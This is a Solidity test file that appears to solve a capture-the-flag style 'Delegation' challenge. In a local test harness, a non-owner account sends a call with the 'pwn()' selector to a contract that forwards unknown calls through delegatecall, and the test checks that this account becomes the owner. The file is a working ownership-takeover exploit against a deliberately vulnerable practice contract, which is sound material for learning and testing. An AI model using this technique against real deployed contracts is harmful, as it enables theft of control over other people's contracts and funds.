// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../contracts/6Delegation.sol";
import "../contracts/utils/TestWithSetup.sol";

contract DelegationAttack is TestWithSetup {
    Delegate private delegateContract;
    Delegation private challengeContract;

    constructor() {
        delegateContract = new Delegate(owner);
        vm.prank(owner);
        challengeContract = new Delegation(address(delegateContract));
    }

    function testPwn() public {
        assertEq(challengeContract.owner(), owner);
        vm.prank(user);
        (bool success, ) = address(challengeContract).call(abi.encodeWithSelector(bytes4(keccak256("pwn()"))));
        assertEq(challengeContract.owner(), user);

    }
}
